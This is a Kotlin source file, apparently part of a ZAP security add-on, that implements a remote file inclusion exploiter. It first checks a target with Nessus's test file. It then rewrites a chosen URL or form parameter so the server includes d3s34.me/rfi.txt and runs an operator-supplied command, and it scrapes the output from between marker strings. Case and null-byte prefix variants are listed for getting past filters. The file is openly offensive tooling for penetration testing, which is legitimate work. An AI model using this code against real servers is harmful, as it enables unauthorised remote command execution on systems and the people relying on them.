package me.d3s34.rfi

import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.*
import io.ktor.client.request.forms.*
import io.ktor.client.statement.*
import io.ktor.http.*
import org.zaproxy.addon.naf.model.RfiRequest
import java.net.URL

class RfiExploiter {
    suspend fun validate(rfiRequest: RfiRequest): Boolean {
        if (rfiRequest.url == null) {
            return false
        }

        return kotlin.runCatching {
            val body = exploit(rfiRequest.copy(remoteFileInclude = nessusRfiCheck))
            body.contains(nessusPatternCheck)
        }.getOrDefault(false)
    }

    suspend fun exploit(rfiRequest: RfiRequest): String {
        rfiRequest.url?.let {
            return exploit(
                rfiRequest.url,
                rfiRequest.param,
                rfiRequest.remoteFileInclude,
                rfiRequest.data,
                rfiRequest.cookie,
                rfiRequest.command
            )
        }
        return ""
    }

    suspend fun exploit(
        url: URL,
        param: String,
        remoteFileInclude: String,
        data: String? = null,
        cookie: String? = null,
        command: String? = null
    ): String {
        return kotlin.runCatching {
            val body = transformRequest(url, param, rfiExploit, data, cookie, command)
            val match = rfiExploiterCheck.find(body)

            return match?.groups?.get(1)?.value ?: "No Response"
        }.getOrDefault("")
    }

    private suspend fun transformRequest(
        url: URL,
        param: String,
        remoteFileInclude: String,
        data: String? = null,
        cookie: String? = null,
        command: String?
    ): String {

        val query = parseQueryString(url.query)

        val attackQuery = query
            .entries()
            .associate { entry ->
                if (entry.key != param) {
                    entry.toPair()
                } else {
                    val (key, value) = entry
                    val attackValue = value.map { transformToPayload(it, remoteFileInclude) }
                    Pair(key, attackValue)
                }
            }

        val attackParameters = parametersOf(
            if (command == null) attackQuery else (attackQuery + Pair("rfi", listOf(command)))
        )

        val attackUrl = URLBuilder(
            protocol = URLProtocol(url.protocol, url.port),
            host = "${url.host}:${url.port}",
            port = url.port,
            pathSegments = url.path.split("/"),
            parameters = attackParameters
        ).build()

        return if (data.isNullOrEmpty()) {
            client.get(attackUrl.toString()) {
                cookie?.let {
                    header("Cookie", it)
                }
            }.bodyAsText()
        } else {
            val bodyParsed = parseQueryString(data)

            val attackBody = bodyParsed
                .entries()
                .associate { entry ->
                    if (entry.key == param) {
                        val (key, value) = entry
                        val attackValue = value.map { transformToPayload(it, remoteFileInclude) }
                        Pair(key, attackValue)
                    } else {
                        entry.toPair()
                    }
                }

            val bodyAttackParameters = parametersOf(attackBody)

            client.post(attackUrl) {
                setBody(FormDataContent(bodyAttackParameters))
                cookie?.let {
                    header("Cookie", it)
                }
            }.bodyAsText()
        }
    }

    private fun transformToPayload(paramValue: String, remoteFileInclude: String): String {
        val prefix = regexRfiPrefix.find(paramValue)?.value ?: ""
        return prefix + remoteFileInclude
    }

    companion object {
        val client = HttpClient(CIO)

        const val nessusRfiCheck = "rfi.nessus.org/rfi.txt"

        const val nessusPatternCheck = "NessusCodeExecTest"

        const val rfiExploit = "d3s34.me/rfi.txt"

        const val rfiExploitMargin = "rfitest___rfitest"

        val rfiExploiterCheck = "$rfiExploitMargin(.*)$rfiExploitMargin".toRegex(RegexOption.DOT_MATCHES_ALL)

        val regexRfiPrefix = "^\\x00?https?:\\/\\/".toRegex(RegexOption.IGNORE_CASE)

        private val NULL_BYTE_CHARACTER = Char(0)

        val REMOTE_FILE_TARGET_PREFIXES = listOf(
            "http://",
            "",
            "HTTP://",
            "https://",
            "HTTPS://",
            "HtTp://",
            "HtTpS://",
            NULL_BYTE_CHARACTER + "http://",
            NULL_BYTE_CHARACTER + "",
            NULL_BYTE_CHARACTER + "HTTP://",
            NULL_BYTE_CHARACTER + "https://",
            NULL_BYTE_CHARACTER + "HTTPS://",
            NULL_BYTE_CHARACTER + "HtTp://",
            NULL_BYTE_CHARACTER + "HtTpS://"
        )
    }
}
